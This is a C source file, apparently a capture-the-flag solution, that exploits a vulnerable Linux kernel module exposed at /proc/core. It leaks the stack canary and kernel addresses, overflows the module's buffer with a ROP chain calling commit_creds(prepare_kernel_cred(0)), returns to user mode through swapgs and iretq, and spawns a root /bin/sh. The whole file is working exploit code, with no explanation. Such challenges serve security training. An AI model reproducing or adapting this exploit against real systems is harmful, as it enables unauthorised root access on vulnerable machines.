#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pty.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

void set_affinity(int which_cpu) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void show_buf(char *buf, int size) {
    fprintf(stderr, "(%d) length buf : ", size);
    for (int i = 0; i < size; i++) {
        fprintf(stderr, "%02x", (unsigned char)buf[i]);
    }
    fprintf(stderr, "\n");
}

int core_fd;

void init_core() {
    core_fd = open("/proc/core", O_RDWR);
    if (core_fd < 0) {
        perror("open");
        exit(1);
    }
}

void core_read(char *buf) {
    if (ioctl(core_fd, 0x6677889B, buf)) {
        perror("core read");
        exit(1);
    }
}

void core_modify_offset(int offset) {
    if (ioctl(core_fd, 0x6677889C, offset) < 0) {
        perror("modify offset");
        exit(1);
    }
}

void core_write(char *buf, size_t size) {
    if (write(core_fd, buf, size) < 0) {
        perror("write");
        exit(1);
    }
}

void core_copy_func(signed long size) {
    if (ioctl(core_fd, 0x6677889A, size) < 0) {
        perror("copy func");
        exit(1);
    }
}

unsigned long kernel_text_base;

unsigned char unhex(unsigned char c) {
    if ((c >= '0') && (c <= '9')) {
        return c - '0';
    } else if ((c >= 'a') && (c <= 'f')) {
        return c - 'a' + 10;
    } else if ((c >= 'A') && (c <= 'F')) {
        return c - 'A' + 10;
    }
    perror("unhex failed");
}

unsigned long get_kernel_base() {
    FILE *fp = fopen("/tmp/kallsyms", "r");
    // char *line;
    // size_t len;
    // getline(&line, &len, fp);
    // getline(&line, &len, fp);
    char l[0x100];
    fscanf(fp, "%s %s %s\n", l, l, l);
    fscanf(fp, "%s %s %s\n", l, l, l);
    char buf[0x10];
    fread(buf, 1, 0x10, fp);
    char res[0x8];
    for (int i = 0; i < 16; i += 2) {
        int target = 7 - (i >> 1);
        res[target] = unhex(buf[i]) * 16 + unhex(buf[i + 1]);
    }
    return *(unsigned long *)res;
}

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0;
_prepare_kernel_cred prepare_kernel_cred = 0;

void get_root_payload(void) {
    commit_creds(prepare_kernel_cred(0));
}

void get_shell() {
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

int main(void) {
    save_state();
    set_affinity(0);

    init_core();

    char buf[0x100];
    core_modify_offset(0x40);
    core_read(buf);
    show_buf(buf, 0x40);
    unsigned long core_base = *(unsigned long *)(buf + 0x10) - 0x19B;
    fprintf(stderr, "core base: %#lx\n", core_base);

    unsigned long kernel_base = get_kernel_base();
    fprintf(stderr, "kernel base: %#lx\n", kernel_base);
    commit_creds = kernel_base + 0x9c8e0;
    prepare_kernel_cred = kernel_base + 0x9cce0;

    // unsigned long lower_addr = xchgeaxesp & 0xFFFFFFFF;
    unsigned long lower_addr = 0x30000000;
    unsigned long base = lower_addr & ~0xFFF;
    if (mmap(base, 0x100000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) {
        perror("mmap");
        exit(1);
    }
    unsigned long swapgs = kernel_base + 0xa012da;
    unsigned long iretq = kernel_base + 0xa00987;
    unsigned long rop_chain[] = {
        // poprdiret,
        // 0x6f0, // cr4 with smep disabled
        // native_write_cr4,
        get_root_payload,
        swapgs,
        // 0, // dummy
        // 0xdead,
        0x00000246,
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x100000, user_ss};
    show_buf(rop_chain, sizeof(rop_chain));

    *(unsigned long *)(buf + 0x40) = *(unsigned long *)buf;
    // *(unsigned long *)(buf + 0x50) = core_base + 0xf6;
    // *(unsigned long *)(buf + 0x58) = 0xdead;
    memcpy(buf + 0x50, rop_chain, sizeof(rop_chain));

    core_write(buf, sizeof(buf));
    core_copy_func((signed int)0xffff0100);

    return 0;
}
